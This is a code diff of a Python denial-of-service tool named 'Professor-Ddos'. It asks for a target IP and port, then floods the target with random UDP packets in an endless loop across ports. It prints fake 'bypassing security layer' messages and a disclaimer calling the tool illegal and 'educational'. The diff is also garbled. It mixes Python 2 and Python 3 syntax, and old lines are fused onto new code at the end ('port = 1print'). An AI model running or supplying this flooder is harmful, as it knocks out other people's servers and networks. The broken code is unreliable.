@@ -1,11 +1,13 @@
-print ("\033[92m")
+print("\033[92m")
+
 import sys
 import os
 import time
 import socket
 import random
-#Code Time
 from datetime import datetime
+
+# Time
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -13,28 +15,76 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+# Socket Setup
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
+
+# Colors
+GREEN = '\033[92m'
+RED = '\033[91m'
+WHITE = '\033[97m'
 
 os.system("clear")
-os.system("figlet Professor-Ddos")
-print
-print "Coded By : SourabhProfessor"
-print "Author   : SourabhProfessor"
-print "Github   : github.com/SourabhProfessor"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+
+# Stylish Banner
+print(GREEN + r"""
+██████╗ ██████╗  ██████╗ ███████╗███████╗███████╗███████╗ ██████╗ ██████╗ 
+██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
+██████╔╝██████╔╝██║   ██║█████╗  █████╗  ███████╗███████╗██║   ██║██████╔╝
+██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
+██║     ██║  ██║╚██████╔╝██║     ███████╗███████║███████║╚██████╔╝██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
+""")
+
+print(GREEN + "══════════════════════════════════════════════════════════════")
+print("            CODED BY : SourabhProfessor")
+print("            AUTHOR   : SourabhProfessor")
+print("            GITHUB   : github.com/SourabhProfessor")
+print("══════════════════════════════════════════════════════════════")
+print(RED + " NOTE : This Tool Is Illegal & Only For Educational Purpose")
+print(" Use It At Your Own Risk, We Aren't Responsible For Actions")
+print(GREEN + "══════════════════════════════════════════════════════════════\n")
+
+ip = raw_input(GREEN + "IP Target : ")
+port = input(GREEN + "Port      : ")
+
 os.system("clear")
-os.system("figlet Professor-Ddos")
-print("Team : SourabhProfessor")
-print ("\033[92m")
-print "________________TRYING TO REACH THE SERVER_____________________"
-time.sleep(5)
-print "_________________ESTABLISHING CONNECTION_______________________"
+
+print(GREEN + r"""
+██████╗ ██████╗  ██████╗ ███████╗███████╗███████╗███████╗ ██████╗ ██████╗ 
+██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
+██████╔╝██████╔╝██║   ██║█████╗  █████╗  ███████╗███████╗██║   ██║██████╔╝
+██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
+██║     ██║  ██║╚██████╔╝██║     ███████╗███████║███████║╚██████╔╝██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
+""")
+
+print(GREEN + "\n________________ TRYING TO REACH THE SERVER _________________")
+time.sleep(2)
+
+print(GREEN + "________________ ESTABLISHING CONNECTION ____________________")
+time.sleep(2)
+
+print(GREEN + "______________ BYPASSING SECURITY LAYER _____________________")
+time.sleep(2)
+
+print(GREEN + "________________ CONNECTION ESTABLISHED _____________________")
+time.sleep(2)
+
+print(RED + "\nDDOS ATTACK STARTED - EDUCATIONAL PURPOSE ONLY\n")
+time.sleep(2)
+
+sent = 0
+
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+
+    print(GREEN + "Sent %s packet to %s through port:%s" % (sent, ip, port))
+
+    if port == 65534:
+        port = 1print "_________________ESTABLISHING CONNECTION_______________________"
 time.sleep(5)
 print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
 time.sleep(5)
